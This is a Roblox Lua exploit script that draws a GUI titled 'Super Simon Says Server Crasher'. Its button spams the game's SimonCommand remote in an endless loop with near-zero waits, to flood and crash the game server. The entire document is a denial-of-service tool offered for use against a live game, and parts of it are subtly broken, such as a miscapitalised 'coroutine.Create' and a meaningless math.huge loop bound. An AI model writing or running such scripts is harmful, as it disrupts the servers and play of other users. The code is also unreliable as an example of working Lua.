local player = game.Players.LocalPlayer
local guiEnabled = true


-- Create a ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "SimonCrasherGUI"
screenGui.Parent = game.CoreGui

-- Create the draggable frame
local frame = Instance.new("Frame")
frame.Name = "DraggableFrame"
frame.Size = UDim2.new(0, 200, 0, 150)
frame.Position = UDim2.new(0.5, -100, 0.5, -75)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Visible = true
frame.Parent = screenGui

-- Create the title
local title = Instance.new("TextLabel")
title.Name = "Title"
title.Size = UDim2.new(1, 0, 0, 30)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
title.BorderSizePixel = 0
title.Text = "Super Simon Says Server Crasher"
title.Font = Enum.Font.SourceSansBold
title.TextSize = 14
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Parent = frame

-- Create the crash button
local crashButton = Instance.new("TextButton")
crashButton.Name = "CrashButton"
crashButton.Size = UDim2.new(0, 160, 0, 50)
crashButton.Position = UDim2.new(0.5, 0, 0, 40)
crashButton.AnchorPoint = Vector2.new(0.5, 0)
crashButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
crashButton.BorderSizePixel = 0
crashButton.Text = "Crash Server (Spam Click)"
crashButton.Font = Enum.Font.SourceSansBold
crashButton.TextSize = 14
crashButton.TextColor3 = Color3.fromRGB(255, 255, 255)
crashButton.Parent = frame
crashButton.MouseButton1Click:Connect(function()
coroutine.resume(coroutine.Create(function()
for i = 1, (math.huge^math.huge * math.huge^math.huge)*math.huge^math.huge,.1 do
pcall(function()
	while true do
    	game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true,true,1)
        task.wait(.00000000000000000000000000001)
    	game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true,true,2)
        task.wait(.00000000000000000000000000001)
    	game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true,true,3)
		task.wait(.00000000000000000000000000001)
    	game:GetService("ReplicatedStorage").ServerEvents.SimonCommand:InvokeServer(true,true,4)
		task.wait(.00000000000000000000000000001)
	end
end)
end
end))

end)

